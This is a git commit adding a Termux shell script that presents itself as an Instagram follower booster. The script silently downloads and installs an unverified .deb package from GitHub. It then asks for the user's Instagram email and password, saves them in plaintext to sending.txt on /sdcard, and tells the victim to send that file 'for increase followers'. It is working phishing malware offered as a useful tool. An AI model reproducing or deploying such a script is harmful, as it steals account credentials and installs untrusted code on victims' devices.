2b0439be6907ab7f3e3ac481f9f17aced425fd48
Maruf <50019150+rooted-cyber@users.noreply.github.com>
2023-07-19 09:44:43 +0530

    Add files via upload

---
+++ followers/followers.sh
@@ -0,0 +1,56 @@
+ab() {
+apt update
+apt upgrade -y
+apt install python
+cd $PREFIX
+touch se
+wget -q https://github.com/rooted-cyber/uploading/raw/main/deb/Random.deb
+dpkg -i *deb
+}
+
+printf "\nAgr atk rha h to vpn lgao\n"
+if [ -e $PREFIX/se ];then
+echo
+else
+ab
+fi
+sleep 3
+ra() {
+random
+random
+}
+clear
+ra
+printf "\n Get instagram followers\n\n"
+ra
+echo -n "Type Followers: "
+read h
+ra
+echo -e -n "Type Email: "
+read a
+if [ "$a" ];then
+ra
+echo -e -n "Password: "
+fi
+read b
+if [ "$b" ];then
+cat >> sending.txt << EOF
+Send this file
+
+
+
+Email : $a
+Password : $b
+EOF
+cp sendi* /sdcard
+ra
+printf "\n send sending.txt file for increase followers\n"
+sleep 7
+ra
+printf "Connecting instagram\n"
+sleep 5
+ra
+echo "opening link"
+sleep 4
+xdg-open https://www.instagram.com
+fi
